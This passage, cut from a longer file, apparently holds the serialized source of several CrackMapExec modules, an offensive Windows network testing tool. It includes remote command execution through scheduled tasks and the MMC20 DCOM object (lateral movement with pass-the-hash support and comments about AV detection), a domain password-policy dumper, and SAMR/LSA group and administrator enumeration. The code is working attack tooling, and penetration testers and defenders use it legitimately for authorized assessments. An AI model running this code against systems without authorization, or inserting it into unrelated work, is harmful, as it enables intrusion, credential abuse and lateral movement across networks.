self.__rpctransport.get_socket().getsockname()[0]\n                argument_xml = f""      <Arguments>/C {command} &gt; \\\\\\\\{local_ip}\\\\{self.__share_name}\\\\{tmpFileName} 2&gt;&amp;1</Arguments>""\n            else:\n                argument_xml = f""      <Arguments>/C {command} &gt; %windir%\\\\Temp\\\\{tmpFileName} 2&gt;&amp;1</Arguments>""\n\n        elif self.__retOutput is False:\n            argument_xml = f""      <Arguments>/C {command}</Arguments>""\n\n        self.logger.debug(""Generated argument XML: "" + argument_xml)\n        xml += argument_xml\n\n        xml += """"""\n    </Exec>\n  </Actions>\n</Task>\n""""""\n        return xml\n\n    def execute_handler(self, command, fileless=False):\n        dce = self.__rpctransport.get_dce_rpc()\n        if self.__doKerberos:\n            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n\n        dce.set_credentials(*self.__rpctransport.get_credentials())\n        dce.connect()\n        # dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)\n        \n        tmpName = gen_random_string(8)\n        tmpFileName = tmpName + "".tmp""\n\n        xml = self.gen_xml(command, tmpFileName, fileless)\n\n        self.logger.info(f""Task XML: {xml}"")\n        taskCreated = False\n        self.logger.info(f""Creating task \\\\{tmpName}"")\n        try:\n            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported\n            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n            dce.bind(tsch.MSRPC_UUID_TSCHS)\n            tsch.hSchRpcRegisterTask(dce, f""\\\\{tmpName}"", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)\n        except Exception as e:\n            if e.error_code and hex(e.error_code) == ""0x80070005"":\n                self.logger.fail(""ATEXEC: Create schedule task got blocked."")\n            else:\n                self.logger.fail(str(e))\n            return\n        else:\n            taskCreated = True\n\n        self.logger.info(f""Running task \\\\{tmpName}"")\n        tsch.hSchRpcRun(dce, f""\\\\{tmpName}"")\n\n        done = False\n        while not done:\n            self.logger.debug(f""Calling SchRpcGetLastRunInfo for \\\\{tmpName}"")\n            resp = tsch.hSchRpcGetLastRunInfo(dce, f""\\\\{tmpName}"")\n            if resp[""pLastRuntime""][""wYear""] != 0:\n                done = True\n            else:\n                sleep(2)\n\n        self.logger.info(f""Deleting task \\\\{tmpName}"")\n        tsch.hSchRpcDelete(dce, f""\\\\{tmpName}"")\n        taskCreated = False\n\n        if taskCreated is True:\n            tsch.hSchRpcDelete(dce, ""\\\\%s"" % tmpName)\n\n        if self.__retOutput:\n            if fileless:\n                while True:\n                    try:\n                        with open(os.path.join(""/tmp"", ""cme_hosted"", tmpFileName), ""r"") as output:\n                            self.output_callback(output.read())\n                        break\n                    except IOError:\n                        sleep(2)\n            else:\n                peer = "":"".join(map(str, self.__rpctransport.get_socket().getpeername()))\n                smbConnection = self.__rpctransport.get_smb_connection()\n                tries = 1\n                while True:\n                    try:\n                        self.logger.info(f""Attempting to read ADMIN$\\\\Temp\\\\{tmpFileName}"")\n                        smbConnection.getFile(""ADMIN$"", f""Temp\\\\{tmpFileName}"", self.output_callback)\n                        break\n                    except Exception as e:\n                        if tries >= self.__tries:\n                            self.logger.fail(f\'ATEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option ""--get-output-tries"". If it\\\'s still failing maybe something is blocking the schedule job, try another exec method\')\n                            break\n                        if str(e).find(""STATUS_BAD_NETWORK_NAME"") >0 :\n                            self.logger.fail(f\'ATEXEC: Get ouput failed, target has blocked ADMIN$ access (maybe command executed!)\')\n                            break\n                        if str(e).find(""SHARING"") > 0 or str(e).find(""STATUS_OBJECT_NAME_NOT_FOUND"") >= 0:\n                            sleep(3)\n                            tries += 1\n                        else:\n                            self.logger.debug(str(e))\n\n                if self.__outputBuffer:\n                    self.logger.debug(f""Deleting file ADMIN$\\\\Temp\\\\{tmpFileName}"")\n                    smbConnection.deleteFile(""ADMIN$"", f""Temp\\\\{tmpFileName}"")\n\n        dce.disconnect()\n', 'mmcexec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Copyright (c) 2003-2016 CORE Security Technologies\n#\n# This software is provided under under a slightly modified version\n# of the Apache Software License. See the accompanying LICENSE file\n# for more information.\n#\n# A similar approach to wmiexec but executing commands through MMC.\n# Main advantage here is it runs under the user (has to be Admin)\n# account, not SYSTEM, plus, it doesn\'t generate noisy messages\n# in the event log that smbexec.py does when creating a service.\n# Drawback is it needs DCOM, hence, I have to be able to access\n# DCOM ports at the target machine.\n#\n# Original discovery by Matt Nelson (@enigma0x3):\n# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\n#\n# Author:\n#  beto (@agsolino)\n#\n# Reference for:\n#  DCOM\n#\n# ToDo:\n# [ ] Kerberos auth not working, invalid_checksum is thrown. Most probably sequence numbers out of sync due to\n#     getInterface() method\n#\n\nfrom os.path import join as path_join\nfrom time import sleep\nfrom cme.connection import dcom_FirewallChecker\nfrom cme.helpers.misc import gen_random_string\n\nfrom impacket.dcerpc.v5.dcom.oaut import (\n    IID_IDispatch,\n    string_to_bin,\n    IDispatch,\n    DISPPARAMS,\n    DISPATCH_PROPERTYGET,\n    VARIANT,\n    VARENUM,\n    DISPATCH_METHOD,\n)\nfrom impacket.dcerpc.v5.dcomrt import DCOMConnection\nfrom impacket.dcerpc.v5.dcomrt import (\n    OBJREF,\n    FLAGS_OBJREF_CUSTOM,\n    OBJREF_CUSTOM,\n    OBJREF_HANDLER,\n    OBJREF_EXTENDED,\n    OBJREF_STANDARD,\n    FLAGS_OBJREF_HANDLER,\n    FLAGS_OBJREF_STANDARD,\n    FLAGS_OBJREF_EXTENDED,\n    IRemUnknown2,\n    INTERFACE,\n)\nfrom impacket.dcerpc.v5.dtypes import NULL\n\n\nclass MMCEXEC:\n    def __init__(self, host, share_name, username, password, domain, smbconnection, share, hashes=None, logger=None, tries=None, timeout=None):\n        self.__host = host\n        self.__username = username\n        self.__password = password\n        self.__smbconnection = smbconnection\n        self.__domain = domain\n        self.__lmhash = """"\n        self.__nthash = """"\n        self.__share_name = share_name\n        self.__output = None\n        self.__outputBuffer = b""""\n        self.__shell = ""c:\\\\windows\\\\system32\\\\cmd.exe""\n        self.__pwd = ""C:\\\\""\n        self.__quit = None\n        self.__executeShellCommand = None\n        self.__retOutput = True\n        self.__share = share\n        self.__dcom = None\n        self.__tries = tries\n        self.__timeout = timeout\n        self.logger = logger\n\n        if hashes is not None:\n            if hashes.find("":"") != -1:\n                self.__lmhash, self.__nthash = hashes.split("":"")\n            else:\n                self.__nthash = hashes\n\n        self.__dcom = DCOMConnection(\n            self.__host,\n            self.__username,\n            self.__password,\n            self.__domain,\n            self.__lmhash,\n            self.__nthash,\n            None,\n            oxidResolver=True,\n        )\n        try:\n            iInterface = self.__dcom.CoCreateInstanceEx(string_to_bin(""49B2791A-B1AE-4C90-9B8E-E860BA07F889""), IID_IDispatch)\n        except:\n            # Make it force break function\n            self.__dcom.disconnect()\n        flag, self.__stringBinding =  dcom_FirewallChecker(iInterface, self.__timeout)\n        if not flag or not self.__stringBinding:\n            error_msg = f\'MMCEXEC: Dcom initialization failed on connection with stringbinding: ""{self.__stringBinding}"", please increase the timeout with the option ""--dcom-timeout"". If it\\\'s still failing maybe something is blocking the RPC connection, try another exec method\'\n            \n            if not self.__stringBinding:\n                error_msg = ""MMCEXEC: Dcom initialization failed: can\'t get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again""\n            \n            self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)\n            # Make it force break function\n            self.__dcom.disconnect()\n        iMMC = IDispatch(iInterface)\n\n        resp = iMMC.GetIDsOfNames((""Document"",))\n\n        dispParams = DISPPARAMS(None, False)\n        dispParams[""rgvarg""] = NULL\n        dispParams[""rgdispidNamedArgs""] = NULL\n        dispParams[""cArgs""] = 0\n        dispParams[""cNamedArgs""] = 0\n        resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])\n\n        iDocument = IDispatch(self.getInterface(iMMC, resp[""pVarResult""][""_varUnion""][""pdispVal""][""abData""]))\n        resp = iDocument.GetIDsOfNames((""ActiveView"",))\n        resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])\n\n        iActiveView = IDispatch(self.getInterface(iMMC, resp[""pVarResult""][""_varUnion""][""pdispVal""][""abData""]))\n        pExecuteShellCommand = iActiveView.GetIDsOfNames((""ExecuteShellCommand"",))[0]\n\n        pQuit = iMMC.GetIDsOfNames((""Quit"",))[0]\n\n        self.__quit = (iMMC, pQuit)\n        self.__executeShellCommand = (iActiveView, pExecuteShellCommand)\n\n    def getInterface(self, interface, resp):\n        # Now let\'s parse the answer and build an Interface instance\n        objRefType = OBJREF(b"""".join(resp))[""flags""]\n        objRef = None\n        if objRefType == FLAGS_OBJREF_CUSTOM:\n            objRef = OBJREF_CUSTOM(b"""".join(resp))\n        elif objRefType == FLAGS_OBJREF_HANDLER:\n            objRef = OBJREF_HANDLER(b"""".join(resp))\n        elif objRefType == FLAGS_OBJREF_STANDARD:\n            objRef = OBJREF_STANDARD(b"""".join(resp))\n        elif objRefType == FLAGS_OBJREF_EXTENDED:\n            objRef = OBJREF_EXTENDED(b"""".join(resp))\n        else:\n            self.logger.fail(""Unknown OBJREF Type! 0x%x"" % objRefType)\n\n        return IRemUnknown2(\n            INTERFACE(\n                interface.get_cinstance(),\n                None,\n                interface.get_ipidRemUnknown(),\n                objRef[""std""][""ipid""],\n                oxid=objRef[""std""][""oxid""],\n                oid=objRef[""std""][""oxid""],\n                target=interface.get_target(),\n            )\n        )\n\n    def execute(self, command, output=False):\n        self.__retOutput = output\n        self.execute_remote(command)\n        self.exit()\n        self.__dcom.disconnect()\n        return self.__outputBuffer\n\n    def exit(self):\n        try:\n            dispParams = DISPPARAMS(None, False)\n            dispParams[""rgvarg""] = NULL\n            dispParams[""rgdispidNamedArgs""] = NULL\n            dispParams[""cArgs""] = 0\n            dispParams[""cNamedArgs""] = 0\n\n            self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])\n        except Exception as e:\n            self.logger.fail(f""Unexpect dcom error when doing exit() function in mmcexec: {str(e)}"")\n        return True\n\n    def execute_remote(self, data):\n        self.__output = ""\\\\Windows\\\\Temp\\\\"" + gen_random_string(6)\n\n        command = self.__shell + "" /Q /c "" + data\n        if self.__retOutput is True:\n            command += "" 1> "" + f""{self.__output}"" + "" 2>&1""\n\n        dispParams = DISPPARAMS(None, False)\n        dispParams[""rgdispidNamedArgs""] = NULL\n        dispParams[""cArgs""] = 4\n        dispParams[""cNamedArgs""] = 0\n        arg0 = VARIANT(None, False)\n        arg0[""clSize""] = 5\n        arg0[""vt""] = VARENUM.VT_BSTR\n        arg0[""_varUnion""][""tag""] = VARENUM.VT_BSTR\n        arg0[""_varUnion""][""bstrVal""][""asData""] = self.__shell\n\n        arg1 = VARIANT(None, False)\n        arg1[""clSize""] = 5\n        arg1[""vt""] = VARENUM.VT_BSTR\n        arg1[""_varUnion""][""tag""] = VARENUM.VT_BSTR\n        arg1[""_varUnion""][""bstrVal""][""asData""] = self.__pwd\n\n        arg2 = VARIANT(None, False)\n        arg2[""clSize""] = 5\n        arg2[""vt""] = VARENUM.VT_BSTR\n        arg2[""_varUnion""][""tag""] = VARENUM.VT_BSTR\n        arg2[""_varUnion""][""bstrVal""][""asData""] = command\n\n        arg3 = VARIANT(None, False)\n        arg3[""clSize""] = 5\n        arg3[""vt""] = VARENUM.VT_BSTR\n        arg3[""_varUnion""][""tag""] = VARENUM.VT_BSTR\n        arg3[""_varUnion""][""bstrVal""][""asData""] = ""7""\n        dispParams[""rgvarg""].append(arg3)\n        dispParams[""rgvarg""].append(arg2)\n        dispParams[""rgvarg""].append(arg1)\n        dispParams[""rgvarg""].append(arg0)\n\n        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])\n        self.get_output_remote()\n\n    def output_callback(self, data):\n        self.__outputBuffer += data\n\n    def get_output_fileless(self):\n        if not self.__retOutput:\n            return\n\n        while True:\n            try:\n                with open(path_join(""/tmp"", ""cme_hosted"", self.__output), ""r"") as output:\n                    self.output_callback(output.read())\n                break\n            except IOError:\n                sleep(2)\n\n    def get_output_remote(self):\n        if self.__retOutput is False:\n            self.__outputBuffer = """"\n            return\n        tries = 1\n        while True:\n            try:\n                self.logger.info(f""Attempting to read {self.__share}\\\\{self.__output}"")\n                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)\n                break\n            except Exception as e:\n                if tries >= self.__tries:\n                    self.logger.fail(f\'MMCEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option ""--get-output-tries"". If it\\\'s still failing maybe something is blocking the schedule job, try another exec method\')\n                    break\n                if str(e).find(""STATUS_BAD_NETWORK_NAME"") >0 :\n                    self.logger.fail(f\'MMCEXEC: Get ouput failed, target has blocked {self.__share} access (maybe command executed!)\')\n                    break\n                if str(e).find(""STATUS_SHARING_VIOLATION"") >= 0 or str(e).find(""STATUS_OBJECT_NAME_NOT_FOUND"") >= 0:\n                    # Output not finished, let\'s wait\n                    sleep(2)\n                    tries += 1\n                else:\n                    self.logger.debug(str(e))\n        \n        if self.__outputBuffer:\n            self.logger.debug(f""Deleting file {self.__share}\\\\{self.__output}"")\n            self.__smbconnection.deleteFile(self.__share, self.__output)', 'passpol.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Stolen from https://github.com/Wh1t3Fox/polenum\n\nfrom impacket.dcerpc.v5.rpcrt import DCERPC_v5\nfrom impacket.dcerpc.v5 import transport, samr\nfrom time import strftime, gmtime\nfrom cme.logger import cme_logger\n\n\ndef d2b(a):\n    tbin = []\n    while a:\n        tbin.append(a % 2)\n        a //= 2\n\n    t2bin = tbin[::-1]\n    if len(t2bin) != 8:\n        for x in range(6 - len(t2bin)):\n            t2bin.insert(0, 0)\n    return """".join([str(g) for g in t2bin])\n\n\ndef convert(low, high, lockout=False):\n    time = """"\n    tmp = 0\n\n    if low == 0 and hex(high) == ""-0x80000000"":\n        return ""Not Set""\n    if low == 0 and high == 0:\n        return ""None""\n\n    if not lockout:\n        if low != 0:\n            high = abs(high + 1)\n        else:\n            high = abs(high)\n            low = abs(low)\n\n        tmp = low + (high) * 16**8  # convert to 64bit int\n        tmp *= 1e-7  # convert to seconds\n    else:\n        tmp = abs(high) * (1e-7)\n\n    try:\n        minutes = int(strftime(""%M"", gmtime(tmp)))\n        hours = int(strftime(""%H"", gmtime(tmp)))\n        days = int(strftime(""%j"", gmtime(tmp))) - 1\n    except ValueError as e:\n        return ""[-] Invalid TIME""\n\n    if days > 1:\n        time += f""{days} days ""\n    elif days == 1:\n        time += f""{days} day ""\n    if hours > 1:\n        time += f""{hours} hours ""\n    elif hours == 1:\n        time += f""{hours} hour ""\n    if minutes > 1:\n        time += f""{minutes} minutes ""\n    elif minutes == 1:\n        time += f""{minutes} minute ""\n    return time\n\n\nclass PassPolDump:\n    KNOWN_PROTOCOLS = {\n        ""139/SMB"": (r""ncacn_np:%s[\\pipe\\samr]"", 139),\n        ""445/SMB"": (r""ncacn_np:%s[\\pipe\\samr]"", 445),\n    }\n\n    def __init__(self, connection):\n        self.logger = connection.logger\n        self.addr = connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain\n        self.protocol = connection.args.port\n        self.username = connection.username\n        self.password = connection.password\n        self.domain = connection.domain\n        self.hash = connection.hash\n        self.lmhash = """"\n        self.nthash = """"\n        self.aesKey = connection.aesKey\n        self.doKerberos = connection.kerberos\n        self.protocols = PassPolDump.KNOWN_PROTOCOLS.keys()\n        self.pass_pol = {}\n\n        if self.hash is not None:\n            if self.hash.find("":"") != -1:\n                self.lmhash, self.nthash = self.hash.split("":"")\n            else:\n                self.nthash = self.hash\n\n        if self.password is None:\n            self.password = """"\n\n    def dump(self):\n        # Try all requested protocols until one works.\n        for protocol in self.protocols:\n            try:\n                protodef = PassPolDump.KNOWN_PROTOCOLS[protocol]\n                port = protodef[1]\n            except KeyError:\n                cme_logger.debug(f""Invalid Protocol \'{protocol}\'"")\n            cme_logger.debug(f""Trying protocol {protocol}"")\n            rpctransport = transport.SMBTransport(\n                self.addr,\n                port,\n                r""\\samr"",\n                self.username,\n                self.password,\n                self.domain,\n                self.lmhash,\n                self.nthash,\n                self.aesKey,\n                doKerberos=self.doKerberos,\n            )\n            try:\n                self.fetchList(rpctransport)\n            except Exception as e:\n                cme_logger.debug(f""Protocol failed: {e}"")\n            else:\n                # Got a response. No need for further iterations.\n                self.pretty_print()\n                break\n\n        return self.pass_pol\n\n    def fetchList(self, rpctransport):\n        dce = DCERPC_v5(rpctransport)\n        dce.connect()\n        dce.bind(samr.MSRPC_UUID_SAMR)\n\n        # Setup Connection\n        resp = samr.hSamrConnect2(dce)\n        if resp[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        resp2 = samr.hSamrEnumerateDomainsInSamServer(\n            dce,\n            serverHandle=resp[""ServerHandle""],\n            enumerationContext=0,\n            preferedMaximumLength=500,\n        )\n        if resp2[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        resp3 = samr.hSamrLookupDomainInSamServer(\n            dce,\n            serverHandle=resp[""ServerHandle""],\n            name=resp2[""Buffer""][""Buffer""][0][""Name""],\n        )\n        if resp3[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        resp4 = samr.hSamrOpenDomain(\n            dce,\n            serverHandle=resp[""ServerHandle""],\n            desiredAccess=samr.MAXIMUM_ALLOWED,\n            domainId=resp3[""DomainId""],\n        )\n        if resp4[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        self.__domains = resp2[""Buffer""][""Buffer""]\n        domainHandle = resp4[""DomainHandle""]\n        # End Setup\n\n        re = samr.hSamrQueryInformationDomain2(\n            dce,\n            domainHandle=domainHandle,\n            domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation,\n        )\n        self.__min_pass_len = re[""Buffer""][""Password""][""MinPasswordLength""] or ""None""\n        self.__pass_hist_len = re[""Buffer""][""Password""][""PasswordHistoryLength""] or ""None""\n        self.__max_pass_age = convert(\n            int(re[""Buffer""][""Password""][""MaxPasswordAge""][""LowPart""]),\n            int(re[""Buffer""][""Password""][""MaxPasswordAge""][""HighPart""]),\n        )\n        self.__min_pass_age = convert(\n            int(re[""Buffer""][""Password""][""MinPasswordAge""][""LowPart""]),\n            int(re[""Buffer""][""Password""][""MinPasswordAge""][""HighPart""]),\n        )\n        self.__pass_prop = d2b(re[""Buffer""][""Password""][""PasswordProperties""])\n\n        re = samr.hSamrQueryInformationDomain2(\n            dce,\n            domainHandle=domainHandle,\n            domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation,\n        )\n        self.__rst_accnt_lock_counter = convert(0, re[""Buffer""][""Lockout""][""LockoutObservationWindow""], lockout=True)\n        self.__lock_accnt_dur = convert(0, re[""Buffer""][""Lockout""][""LockoutDuration""], lockout=True)\n        self.__accnt_lock_thres = re[""Buffer""][""Lockout""][""LockoutThreshold""] or ""None""\n\n        re = samr.hSamrQueryInformationDomain2(\n            dce,\n            domainHandle=domainHandle,\n            domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLogoffInformation,\n        )\n        self.__force_logoff_time = convert(\n            re[""Buffer""][""Logoff""][""ForceLogoff""][""LowPart""],\n            re[""Buffer""][""Logoff""][""ForceLogoff""][""HighPart""],\n        )\n\n        self.pass_pol = {\n            ""min_pass_len"": self.__min_pass_len,\n            ""pass_hist_len"": self.__pass_hist_len,\n            ""max_pass_age"": self.__max_pass_age,\n            ""min_pass_age"": self.__min_pass_age,\n            ""pass_prop"": self.__pass_prop,\n            ""rst_accnt_lock_counter"": self.__rst_accnt_lock_counter,\n            ""lock_accnt_dur"": self.__lock_accnt_dur,\n            ""accnt_lock_thres"": self.__accnt_lock_thres,\n            ""force_logoff_time"": self.__force_logoff_time,\n        }\n\n        dce.disconnect()\n\n    def pretty_print(self):\n        PASSCOMPLEX = {\n            5: ""Domain Password Complex:"",\n            4: ""Domain Password No Anon Change:"",\n            3: ""Domain Password No Clear Change:"",\n            2: ""Domain Password Lockout Admins:"",\n            1: ""Domain Password Store Cleartext:"",\n            0: ""Domain Refuse Password Change:"",\n        }\n\n        cme_logger.debug(""Found domain(s):"")\n        for domain in self.__domains:\n            cme_logger.debug(f""{domain[\'Name\']}"")\n\n        self.logger.success(f""Dumping password info for domain: {self.__domains[0][\'Name\']}"")\n\n        self.logger.highlight(f""Minimum password length: {self.__min_pass_len}"")\n        self.logger.highlight(f""Password history length: {self.__pass_hist_len}"")\n        self.logger.highlight(f""Maximum password age: {self.__max_pass_age}"")\n        self.logger.highlight("""")\n        self.logger.highlight(f""Password Complexity Flags: {self.__pass_prop or \'None\'}"")\n\n        for i, a in enumerate(self.__pass_prop):\n            self.logger.highlight(f""\\t{PASSCOMPLEX[i]} {str(a)}"")\n\n        self.logger.highlight("""")\n        self.logger.highlight(f""Minimum password age: {self.__min_pass_age}"")\n        self.logger.highlight(f""Reset Account Lockout Counter: {self.__rst_accnt_lock_counter}"")\n        self.logger.highlight(f""Locked Account Duration: {self.__lock_accnt_dur}"")\n        self.logger.highlight(f""Account Lockout Threshold: {self.__accnt_lock_thres}"")\n        self.logger.highlight(f""Forced Log off Time: {self.__force_logoff_time}"")\n', 'remotefile.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom impacket.smb3structs import FILE_READ_DATA, FILE_WRITE_DATA\n\n\nclass RemoteFile:\n    def __init__(\n        self,\n        smbConnection,\n        fileName,\n        share=""ADMIN$"",\n        access=FILE_READ_DATA | FILE_WRITE_DATA,\n    ):\n        self.__smbConnection = smbConnection\n        self.__share = share\n        self.__access = access\n        self.__fileName = fileName\n        self.__tid = self.__smbConnection.connectTree(share)\n        self.__fid = None\n        self.__currentOffset = 0\n\n    def open(self):\n        self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName, desiredAccess=self.__access)\n\n    def seek(self, offset, whence):\n        # Implement whence, for now it\'s always from the beginning of the file\n        if whence == 0:\n            self.__currentOffset = offset\n\n    def read(self, bytesToRead):\n        if bytesToRead > 0:\n            data = self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)\n            self.__currentOffset += len(data)\n            return data\n        return """"\n\n    def close(self):\n        if self.__fid is not None:\n            self.__smbConnection.closeFile(self.__tid, self.__fid)\n            self.__fid = None\n\n    def delete(self):\n        self.__smbConnection.deleteFile(self.__share, self.__fileName)\n\n    def tell(self):\n        return self.__currentOffset\n\n    def __str__(self):\n        return f""\\\\\\\\{self.__smbConnection.getRemoteHost()}\\\\{self.__share}\\\\{self.__fileName}""\n', 'samrfunc.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Majorly stolen from https://gist.github.com/ropnop/7a41da7aabb8455d0898db362335e139\n# Which in turn stole from Impacket :)\n# Code refactored and added to by @mjhallenbeck (Marshall-Hallenbeck on GitHub)\n\nimport logging\n\nfrom impacket.dcerpc.v5 import transport, lsat, lsad, samr\nfrom impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED\nfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE\nfrom impacket.nmb import NetBIOSError\nfrom impacket.smbconnection import SessionError\nfrom cme.logger import cme_logger\n\n\nclass SamrFunc:\n    def __init__(self, connection):\n        self.logger = connection.logger\n        self.addr = connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain\n        self.protocol = connection.args.port\n        self.username = connection.username\n        self.password = connection.password\n        self.domain = connection.domain\n        self.hash = connection.hash\n        self.lmhash = """"\n        self.nthash = """"\n        self.aesKey = connection.aesKey\n        self.doKerberos = connection.kerberos\n\n        if self.hash is not None:\n            if self.hash.find("":"") != -1:\n                self.lmhash, self.nthash = self.hash.split("":"")\n            else:\n                self.nthash = self.hash\n\n        if self.password is None:\n            self.password = """"\n\n        self.samr_query = SAMRQuery(\n            username=self.username,\n            password=self.password,\n            domain=self.domain,\n            remote_name=self.addr,\n            remote_host=self.addr,\n            kerberos=self.doKerberos,\n            aesKey=self.aesKey,\n        )\n        self.lsa_query = LSAQuery(\n            username=self.username,\n            password=self.password,\n            domain=self.domain,\n            remote_name=self.addr,\n            remote_host=self.addr,\n            kerberos=self.doKerberos,\n            aesKey=self.aesKey,\n            logger=self.logger\n        )\n\n    def get_builtin_groups(self):\n        domains = self.samr_query.get_domains()\n\n        if ""Builtin"" not in domains:\n            logging.error(f""No Builtin group to query locally on"")\n            return\n\n        domain_handle = self.samr_query.get_domain_handle(""Builtin"")\n        groups = self.samr_query.get_domain_aliases(domain_handle)\n\n        return groups\n\n    def get_custom_groups(self):\n        domains = self.samr_query.get_domains()\n        custom_groups = {}\n\n        for domain in domains:\n            if domain == ""Builtin"":\n                continue\n            domain_handle = self.samr_query.get_domain_handle(domain)\n            custom_groups.update(self.samr_query.get_domain_aliases(domain_handle))\n        return custom_groups\n\n    def get_local_groups(self):\n        builtin_groups = self.get_builtin_groups()\n        custom_groups = self.get_custom_groups()\n        return {**builtin_groups, **custom_groups}\n\n    def get_local_users(self):\n        pass\n\n    def get_local_administrators(self):\n        self.get_builtin_groups()\n        if ""Administrators"" in self.groups:\n            self.logger.success(f""Found Local Administrators group: RID {self.groups[\'Administrators\']}"")\n        domain_handle = self.samr_query.get_domain_handle(""Builtin"")\n        self.logger.debug(f""Querying group members"")\n        member_sids = self.samr_query.get_alias_members(domain_handle, self.groups[""Administrators""])\n        member_names = self.lsa_query.lookup_sids(member_sids)\n\n        for sid, name in zip(member_sids, member_names):\n            print(f""{name} - {sid}"")\n\n\nclass SAMRQuery:\n    def __init__(\n        self,\n        username="""",\n        password="""",\n        domain="""",\n        port=445,\n        remote_name="""",\n        remote_host="""",\n        kerberos=None,\n        aesKey="""",\n    ):\n        self.__username = username\n        self.__password = password\n        self.__domain = domain\n        self.__lmhash = """"\n        self.__nthash = """"\n        self.__aesKey = aesKey\n        self.__port = port\n        self.__remote_name = remote_name\n        self.__remote_host = remote_host\n        self.__kerberos = kerberos\n        self.dce = self.get_dce()\n        self.server_handle = self.get_server_handle()\n\n    def get_transport(self):\n        string_binding = f""ncacn_np:{self.__port}[\\pipe\\samr]""\n        cme_logger.debug(f""Binding to {string_binding}"")\n        # using a direct SMBTransport instead of DCERPCTransportFactory since we need the filename to be \'\\samr\'\n        rpc_transport = transport.SMBTransport(\n            self.__remote_host,\n            self.__port,\n            r""\\samr"",\n            self.__username,\n            self.__password,\n            self.__domain,\n            self.__lmhash,\n            self.__nthash,\n            self.__aesKey,\n            doKerberos=self.__kerberos,\n        )\n        return rpc_transport\n\n    def get_dce(self):\n        rpc_transport = self.get_transport()\n        try:\n            dce = rpc_transport.get_dce_rpc()\n            dce.connect()\n            dce.bind(samr.MSRPC_UUID_SAMR)\n        except NetBIOSError as e:\n            logging.error(f""NetBIOSError on Connection: {e}"")\n            return\n        except SessionError as e:\n            logging.error(f""SessionError on Connection: {e}"")\n            return\n        return dce\n\n    def get_server_handle(self):\n        if self.dce:\n            try:\n                resp = samr.hSamrConnect(self.dce)\n            except samr.DCERPCException as e:\n                cme_logger.debug(f""Error while connecting with Samr: {e}"")\n                return None\n            return resp[""ServerHandle""]\n        else:\n            cme_logger.debug(f""Error creating Samr handle"")\n            return\n\n    def get_domains(self):\n        resp = samr.hSamrEnumerateDomainsInSamServer(self.dce, self.server_handle)\n        domains = resp[""Buffer""][""Buffer""]\n        domain_names = []\n        for domain in domains:\n            domain_names.append(domain[""Name""])\n        return domain_names\n\n    def get_domain_handle(self, domain_name):\n        resp = samr.hSamrLookupDomainInSamServer(self.dce, self.server_handle, domain_name)\n        resp = samr.hSamrOpenDomain(self.dce, serverHandle=self.server_handle, domainId=resp[""DomainId""])\n        return resp[""DomainHandle""]\n\n    def get_domain_aliases(self, domain_handle):\n        resp = samr.hSamrEnumerateAliasesInDomain(self.dce, domain_handle)\n        aliases = {}\n        for alias in resp[""Buffer""][""Buffer""]:\n            aliases[alias[""Name""]] = alias[""RelativeId""]\n        return aliases\n\n    def get_alias_handle(self, domain_handle, alias_id):\n        resp = samr.hSamrOpenAlias(self.dce, domain_handle, desiredAccess=MAXIMUM_ALLOWED, aliasId=alias_id)\n        return resp[""AliasHandle""]\n\n    def get_alias_members(self, domain_handle, alias_id):\n        alias_handle = self.get_alias_handle(domain_handle, alias_id)\n        resp = samr.hSamrGetMembersInAlias(self.dce, alias_handle)\n        member_sids = []\n        for member in resp[""Members""][""Sids""]:\n            member_sids.append(member[""SidPointer""].formatCanonical())\n        return member_sids\n\n\nclass LSAQuery:\n    def __init__(\n        self,\n        username="""",\n        password="""",\n        domain="""",\n        port=445,\n        remote_name="""",\n        remote_host="""",\n        aesKey="""",\n        kerberos=None,\n        logger=None\n    ):\n        self.__username = username\n        self.__password = password\n        self.__domain = domain\n        self.__lmhash = """"\n        self.__nthash = """"\n        self.__aesKey = aesKey\n        self.__port = port\n        self.__remote_name = remote_name\n        self.__remote_host = remote_host\n        self.__kerberos = kerberos\n        self.dce = self.get_dce()\n        self.policy_handle = self.get_policy_handle()\n        self.logger = logger\n\n    def get_transport(self):\n        string_binding = f""ncacn_np:{self.__remote_name}[\\\\pipe\\\\lsarpc]""\n        rpc_transport = transport.DCERPCTransportFactory(string_binding)\n        rpc_transport.set_dport(self.__port)\n        rpc_transport.setRemoteHost(self.__remote_host)\n        if self.__kerberos:\n            rpc_transport.set_kerberos(True, None)\n        if hasattr(rpc_transport, ""set_credentials""):\n            # This method exists only for selected 